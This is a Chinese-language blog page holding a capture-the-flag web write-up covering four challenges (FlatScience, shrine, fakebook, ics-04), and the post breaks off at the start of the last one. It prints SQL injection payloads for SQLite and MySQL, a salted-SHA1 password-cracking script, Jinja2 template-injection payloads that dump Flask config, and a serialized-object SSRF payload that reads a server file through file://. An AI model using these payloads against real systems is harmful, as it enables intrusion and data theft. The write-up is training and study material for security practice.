@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0X01: FlatScience 20-03-11">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防daliy">
+<meta property="og:url" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0X01: FlatScience 20-03-11">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/11.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/12.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/13.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/15.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/14.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/16.png">
+<meta property="article:published_time" content="2020-03-11T10:22:54.000Z">
+<meta property="article:modified_time" content="2020-03-19T14:34:44.325Z">
+<meta property="article:author" content="Peguin">
+<meta property="article:tag" content="train">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>攻防daliy | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Peguin">
+      <meta itemprop="description" content="敢于去想，才会有MEteor的光芒闪耀。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          攻防daliy
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-11 18:22:54" itemprop="dateCreated datePublished" datetime="2020-03-11T18:22:54+08:00">2020-03-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-03-19 22:34:44" itemprop="dateModified" datetime="2020-03-19T22:34:44+08:00">2020-03-19</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="0X01-FlatScience-20-03-11"><a href="#0X01-FlatScience-20-03-11" class="headerlink" title="0X01: FlatScience 20-03-11"></a>0X01: FlatScience 20-03-11<a id="more"></a></h4><p>拿到网页，正常操作scan扫一发</p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/1.png" class="" title="examplename">
+
+
+
+<p>访问login.php页面，查看网页源码，有提示</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- <span class="doctag">TODO:</span> Remove ?debug-Parameter! --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>重新访问login.php?debug,拿到了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="string">'usr'</span>];</span><br><span class="line">        $pass = $_POST[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>);</span><br><span class="line">        </span><br><span class="line">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>);</span><br><span class="line">    <span class="keyword">if</span>($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>);</span><br><span class="line">            header(<span class="string">"Location: /"</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span><br><span class="line">highlight_file(<span class="string">'login.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到是SQLite3，查找资料知道sqlite自带的结构表sqlite_master，sql是sqlite_master中的一个字段，注入时经常用到的</p>
+<p>下面就是用sql进行对数据库的查询</p>
+<p><code>usr=1&#39; union select name,sql from sqlite_master--+&amp;pw=</code></p>
+<p>可以得到set-cookie:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">Users</span>(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">hint <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>下面就是分别查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`usr=1' union <span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">Users</span><span class="comment">--+&amp;pw=`  ----name=+admin</span></span><br><span class="line"><span class="string">`usr=1' union select id,password from Users--+&amp;pw=`</span> <span class="comment">----name=+3fab54a50e770d830c0416df817567662a9dc85c;</span></span><br><span class="line"><span class="string">`usr=1' union select id,hint from Users--+&amp;pw=`</span><span class="comment">----name=+my+fav+word+in+my+fav+paper%3F%21;</span></span><br></pre></td></tr></table></figure>
+
+<p>结合上面的源码以及给出的hint，password=str(unknown).”Salz!”,应该要用已知的密码在题目给出的文档中找出加密后相同的那段字符串，也就是进行碰撞，下面给出大佬的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">'utf-8'</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, set()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">	pdf_path = get_pdf()</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Searching word in "</span> + i</span><br><span class="line">		pdf_text = convert_pdf_2_text(i).split(<span class="string">" "</span>)</span><br><span class="line">		<span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">			sha1_password = hashlib.sha1(word+<span class="string">"Salz!"</span>).hexdigest()</span><br><span class="line">			<span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">"Find the password :"</span> + word</span><br><span class="line">				exit()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	find_password()</span><br></pre></td></tr></table></figure>
+
+<p>跑出的密码为ThinJerboa，在admin.php页面登录就可以拿到flag</p>
+<p>（还有一种方法是这段密码刚好可以进行md5解密，去掉题目给出的那部分刚好是ThinJerboa）</p>
+<h4 id="0X02-shrine-20-03-12"><a href="#0X02-shrine-20-03-12" class="headerlink" title="0X02:shrine 20-03-12"></a>0X02:shrine 20-03-12</h4><p>打开网页，整理一下给出的python代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>审一下，发现’()’会被替换为空，在blacklist中的会被置为None，提交的参数在/shrine/的路径下</p>
+<p>下面来进行一下测试</p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/2.png" class="" title="examplename">
+
+<p>通过查阅SSTI模板引擎注入图可以知道应该是jinja2+flask</p>
+<p>由于这里的变量config被禁用，暂时没想到什么办法，看了其他师傅的wp，知道了要用python的沙箱逃逸方法，查了有关flask的内置函数，以下是资料</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url_for() : url_for会根据传入的路由器函数名，返回该路由的URL，在模板中始终使用url_for（）就可以安全的修改路由绑定的URL，则不必担心模板中渲染错的连接，&#123;&#123;url_for(&#39;home&#39;)&#125;&#125; ，如果我们定义的路由URL是带有参数的，则可以把他们作为关键字参数传入url_for（），Flask会把他们填充进最终生成的URL中，&#123;&#123;url_for(&#39;post&#39;,post_id&#x3D;1)&#125;&#125;</span><br><span class="line"></span><br><span class="line">get_flashed_messages():这个函数会返回之前在flask中通过flask（）传入的消息的列表，flash函数的作用很简单，可以把由Python字符串表示的信息加入一个消息队列中，在使get_flashed_message()函数取出他们并消费掉</span><br></pre></td></tr></table></figure>
+
+<p>下面用get_flashed_messages()的方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/3.png" class="" title="examplename">
+
+<p>可以找到current_app,继续注入当前app的config</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_fiashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以找到flag，这里就不贴了</p>
+<h4 id="0X03-fakebook-20-03-13"><a href="#0X03-fakebook-20-03-13" class="headerlink" title="0X03:fakebook 20-03-13"></a>0X03:fakebook 20-03-13</h4><p>拿到题目，scan冲一发</p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/4.png" class="" title="examplename">
+
+<p>发现有robots.txt，访问，下载源码user.php.bak</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>审阅源码发现get()可能存在ssrf服务端楼的那个，join一个账号,点username页面跳转，发现一个注入点</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:44796/view.php?no=1</span><br></pre></td></tr></table></figure>
+
+<p>下面开始注入测试：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">no=1 order by 5<span class="comment">#//报错，说明没有五个字段，并且爆出了路径在 /var/www/html/db.php下</span></span><br><span class="line">no=1 order by 5<span class="comment">#//正常回显，说明是4个字段，下面开始爆库</span></span><br></pre></td></tr></table></figure>
+
+<p>这里有一个注意的地方就是,经过多次测试发现union 和select不能同时使用，用注释/**/进行绕过</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">no = -1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">#//爆出fakebook库</span></span><br><span class="line"><span class="keyword">no</span>= <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'fakebook'</span><span class="comment">#//爆出users表</span></span><br><span class="line"><span class="keyword">no</span> = <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span><span class="comment">#爆出no,username,passwd,data字段</span></span><br><span class="line">下面可以一个个查询信息，可以看到<span class="keyword">data</span>中的数据进行了序列化</span><br><span class="line">O:8:"UserInfo":3&#123;s:4:"name";s:7:"hjfashd";s:3:"age";i:1123;s:4:"blog";s:13:"www.baidu.com";&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在目录扫描中可以看到存在flag.php，可以把blog改为/var/www/html/flag.php路径就可以拿到flag了,这里还要注意用file：//协议来读取,此外data在第四个字段，所以这里查询时也要放在第四位</p>
+<p>到这里，我们就可以根据已知的信息来构造payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:no=-1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">'O:8:"UserInfo":3:&#123;s:4:"name";s:3:"ggg";s:3:"age";i:12356;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>查看网页源码，可以看到</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg=='&gt;//base64解码就可以了</span><br></pre></td></tr></table></figure>
+
+<h4 id="0X04ics-04-20-03-14"><a href="#0X04ics-04-20-03-14" class="headerlink" title="0X04ics-04 20-03-14"></a>0X04ics-04 20-03-14</h4><p>根据题目描述，在注册和登录页面存在漏洞，注册一个账号登录，提示说普通用户登录成功但没什么用，看来是要拿到管理员的账号，这里有个忘记密码的页面，但好像暂时没什么用</p>
+<p>上工具，用sqlmap进行尝试</p>
